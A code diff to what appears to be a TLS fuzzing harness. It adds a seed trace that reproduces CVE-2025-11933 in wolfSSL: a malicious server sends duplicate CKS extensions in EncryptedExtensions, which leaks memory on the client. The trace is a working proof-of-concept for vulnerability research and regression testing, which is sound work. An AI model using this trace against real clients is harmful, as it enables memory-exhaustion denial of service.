@@ -45,6 +45,8 @@ pub fn create_corpus(
 
         // Malicious server: CKS extension, X9.146 dual-algorithm certificate (needs PUT support).
         seed_cve_2026_5393: put.supports("tls13") && put.supports("dual_alg_certs_support"),
+        // Malicious server: duplicate CKS extensions (needs PUT support).
+        seed_cve_2025_11933: put.supports("tls13") && put.supports("dual_alg_certs_support"),
     )
 }
 
@@ -1733,6 +1735,119 @@ pub fn seed_cve_2026_5393(client: AgentName) -> Trace<TLSProtocolTypes> {
                             (@curve),
                             fn_false,
                             fn_seq_2,  // sequence 2
+                            fn_new_random,
+                            fn_cipher_suite13_aes_128_gcm_sha256
+                        )
+                    }
+                }),
+            },
+        ],
+        ..Default::default()
+    }
+}
+
+
+/// <https://nvd.nist.gov/vuln/detail/CVE-2025-11933>
+///
+/// Memory leak in `TLSX_CKS_Parse` of wolfSSL < 5.8.4 built with
+/// `--enable-experimental --enable-dual-alg-certs` (X9.146 dual-algorithm certificates), fixed in
+/// 5.8.4 by commit 2885df68b4f55961548d3a292128613c18e6774b
+/// (<https://github.com/wolfSSL/wolfssl/pull/9132>).
+///
+/// Root cause (CWE-20): `TLSX_Parse` rejects duplicate extensions only for types it tracks, and the
+/// CKS extension (0xff92) was not one of them. Each CKS extension parsed allocates a copy in
+/// `ssl->peerSigSpec` without freeing the previous one, so every duplicate leaks the previous copy.
+/// The DoS is memory exhaustion, accumulating over connections. There is no memory error: ASan
+/// only sees it with leak detection on.
+///
+/// Reachability: the CVE names duplicate CKS extensions in a ClientHello (malicious client). A
+/// server only copies the extension when it has an alternative private key, which the tlspuffin
+/// harness never loads. This seed uses the same bug from the other side, which needs no key: a
+/// malicious server sends EncryptedExtensions with two CKS extensions
+/// ([`fn_cks_both_server_extension`]). The client adopts an unsolicited CKS extension when it has
+/// no CKS preference of its own (see [`seed_cve_2026_5393`]). On the second one its preference is
+/// the copy of the first, which matches, so the handshake goes on and the first copy is lost.
+pub fn seed_cve_2025_11933(client: AgentName) -> Trace<TLSProtocolTypes> {
+    let curve = term! {
+        fn_get_any_client_curve(
+            ((client, 0)[Some(TlsQueryMatcher::Handshake(Some(HandshakeType::ClientHello)))])
+        )
+    };
+
+    let server_hello = term! {
+          fn_server_hello(
+            fn_protocol_version12,
+            fn_new_random,
+            ((client, 0)[Some(TlsQueryMatcher::Handshake(Some(HandshakeType::ClientHello)))]),
+            fn_cipher_suite13_aes_128_gcm_sha256,
+            fn_compression,
+            (fn_server_extensions_make(
+              (fn_server_extensions_append(
+                  (fn_server_extensions_append(
+                      fn_server_extensions_new,
+                      (fn_key_share_server_extension(
+                          (fn_key_share_deterministic((@curve)))
+                      ))
+                  )),
+                  fn_supported_versions13_server_extension
+            ))))
+        )
+    };
+
+    let server_hello_transcript = term! {
+        fn_append_transcript(
+            (fn_append_transcript(
+                fn_new_transcript,
+                ((client, 0)[Some(TlsQueryMatcher::Handshake(Some(HandshakeType::ClientHello)))]) // ClientHello
+            )),
+            (@server_hello) // plaintext ServerHello
+        )
+    };
+
+    // The same CKS extension twice
+    let encrypted_extensions = term! {
+        fn_encrypted_extensions(
+            (fn_server_extensions_append(
+                (fn_server_extensions_append(
+                    fn_server_extensions_new,
+                    fn_cks_both_server_extension
+                )),
+                fn_cks_both_server_extension
+            ))
+        )
+    };
+
+    Trace {
+        prior_traces: vec![],
+        descriptors: vec![AgentDescriptor::from_config(
+            client,
+            TLSDescriptorConfig {
+                tls_version: TLSVersion::V1_3,
+                typ: AgentType::Client,
+                // Unrelated to the bug: wolfSSL >= 5.9.1 sends its first key share for a group
+                // tlspuffin cannot compute (see `seed_cve_2026_5393`).
+                groups: Some(String::from("P-256:P-384")),
+                ..TLSDescriptorConfig::default()
+            },
+        )],
+        steps: vec![
+            OutputAction::new_step(client),
+            Step {
+                agent: client,
+                action: Action::Input(input_action! { server_hello
+                }),
+            },
+            Step {
+                agent: client,
+                action: Action::Input(input_action! { term! {
+                        fn_encrypt_handshake(
+                            (@encrypted_extensions),
+                            (@server_hello_transcript),
+                            (fn_get_client_key_share(((client, 0)), (@curve))),
+                            fn_no_psk,
+                            (@curve),
+                            fn_false,
+                            fn_seq_0,  // sequence 0
                             fn_new_random,
                             fn_cipher_suite13_aes_128_gcm_sha256
                         )
